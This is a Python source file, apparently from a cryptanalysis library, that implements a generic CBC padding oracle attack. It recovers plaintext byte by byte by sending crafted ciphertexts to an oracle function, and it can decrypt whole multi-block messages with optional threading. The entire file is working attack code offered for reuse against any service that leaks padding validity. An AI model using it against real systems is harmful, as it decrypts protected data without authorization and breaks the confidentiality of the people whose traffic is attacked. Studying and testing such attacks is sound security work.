from crypsis import logger
from crypsis.scaling import search
from crypsis.misc import xor, rand, chop

"""
This general padding oracle exploit takes

1: A function to query the oracle.
This function should return True if the oracle reports valid padding
and False otherwise.

2: A function to generate padding
The function will be given a message and return 
the padding bytes for said message (not the resulting message).
"""

def decrypt(iv, block, query, padding, threads = 1):
    """Decrypt a single block"""
    assert len(iv) == len(block)
    assert threads > 0
    block_size = len(iv)
    
    # Generate query messages
    def gen_queries(tmp, index):
        for byte in range(0x100):
            test = bytearray(tmp)
            test[index] = byte
            logger.debug('Attempt byte: 0x%02x', byte)
            yield (byte, test + block)
    
    # Decrypt byte-by-byte (last first)
    nulls = bytearray()
    plain = bytearray()
    trial = lambda (b, msg): query(msg)
    for p in range(block_size - 1, -1, -1):
        # Generate ciphertext
        msg = rand(p)
        pad = padding(msg)
        tmp = msg + pad
        assert len(tmp) == block_size
        tmp = xor(tmp, nulls.rjust(block_size, '\x00'))

        # Search for correct padding
        logger.info('Decrypting index %d', p)
        found = search(trial, gen_queries(tmp, p), threads)
        if found is None:
            logger.error('Failed to decrypt byte')
            raise ValueError

        # Infer plaintext byte
        byte, _ = found
        null = byte ^ pad[p - block_size]
        char = byte ^ pad[p - block_size] ^ iv[p]
        nulls = bytearray([null]) + nulls
        plain = bytearray([char]) + plain
        logger.debug('Found 0x%02x' % char)
    return plain

def decrypt_msg(msg, query, padding, iv = None, block_size = 16, threads = 1):
    """Decrypt a message of arbitary length"""
    # Input validation
    msg = bytearray(msg)
    assert len(msg) % block_size == 0
    if iv is not None:
        iv = bytearray(iv)
        assert len(iv) == block_size 
        msg = iv + msg
    else:
        assert len(msg) > block_size

    # Split into "iv", ciphertext pairs
    blocks = chop(bytearray(msg), block_size)
    pairs = zip(blocks, blocks[1:])
    
    # Decrypt every pair seperately (to minimize query size)
    logger.info('Decrypting %d block[s] of data using a padding oracle' % len(pairs))
    out = bytearray()
    for n, (iv, block) in enumerate(pairs):
        logger.info('Decrypting block %d' % n)
        out += decrypt(iv, block, query, padding, threads)
        logger.info('Decrypted block: %s' % str(out[-block_size:]).encode('hex'))
    return out
